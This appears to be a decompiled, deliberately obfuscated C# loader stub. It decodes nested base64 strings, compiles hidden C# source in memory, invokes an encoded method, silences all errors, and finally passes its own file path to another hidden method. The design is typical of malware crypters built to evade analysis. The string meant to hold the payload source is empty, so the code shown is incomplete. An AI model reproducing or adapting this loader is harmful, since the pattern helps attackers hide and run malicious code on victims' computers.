using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Reflection;
using System.Text;

internal class asdladkh123ujaf7123ja9s8d67123
{
  private static CSharpCodeProvider poouqweu6712j3hutasd = new CSharpCodeProvider();
  private static CompilerResults asdo123ugasd;
  private static Type asdk12396has7d6123;

  public static string asd123j87s6123khasd(string base64EncodedData)
  {
    return Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));
  }

  private static void Main(string[] args)
  {
    try
    {
      CompilerParameters options = new CompilerParameters()
      {
        GenerateExecutable = false,
        GenerateInMemory = true
      };
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllsWktlbGxyUlRsUVVUMDk=")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllYcEdiMWx0TVVkaWJIQllUVmQ0YVdKc1JqRlhhMlEwWTNjOVBRPT0=")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllrVnZlRmx0TlZOalIwcFlWbGhXVmsxc1dqVlpWbVJIWXpKR1dXTkhhR3RTTW5neVdXMXJNV0V5U2toa2VqQTk=")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllrVTFjMWt5TldGalJtdDVWbXMxYVUxc1NuTlphMDB4WVRKS1NHUjZNRDA9")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllUSjRVVlJITVZOak1rcENVRlF3UFE9PQ==")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllrVndjMWR0TVRSaVJtdDZWVzVDYVUxcVVqRlhhMlEwWTNjOVBRPT0=")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllUTm9kMWx0TlVaa1ZuQklaVWhOUFE9PQ==")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllUQTFNbGt5TVZaa1ZuQklaVWhOUFE9PQ==")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("Vmtaa2MyRnRUblJQV0hCcFRXeHZkMVJIZEU5V1IwWklVbTVzYWxGNlZuSlphMlF6VUZFOVBRPT0=")))));
      options.ReferencedAssemblies.Add(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VmxST2MyVnRVa2hXYmxKTllrWktkbGt5TVZkaFJuQklZa2hXWVdWVVZsWlhWbWhQWTIxT05VNVhkR2xTTTJNNQ==")))));
      asdladkh123ujaf7123ja9s8d67123.asdo123ugasd = asdladkh123ujaf7123ja9s8d67123.poouqweu6712j3hutasd.CompileAssemblyFromSource(options, asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(""))));
      asdladkh123ujaf7123ja9s8d67123.asdk12396has7d6123 = asdladkh123ujaf7123ja9s8d67123.asdo123ugasd.CompiledAssembly.GetType(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VlVoS2Rsb3pTbWhpVkVrOQ=="))));
      asdladkh123ujaf7123ja9s8d67123.asdk12396has7d6123.GetMethod(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("Vmtaa1IyTkhTbTVRVkRBOQ==")))), BindingFlags.Static | BindingFlags.Public).Invoke((object) null, (object[]) null);
    }
    catch
    {
    }
    finally
    {
      asdladkh123ujaf7123ja9s8d67123.asdk12396has7d6123.GetMethod(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd(asdladkh123ujaf7123ja9s8d67123.asd123j87s6123khasd("VVZaT1VWSkdWVFZOVkVsNlV6QndRZz09"))), BindingFlags.Static | BindingFlags.Public).Invoke((object) null, new object[1]
      {
        (object) Assembly.GetExecutingAssembly().Location
      });
    }
  }
}
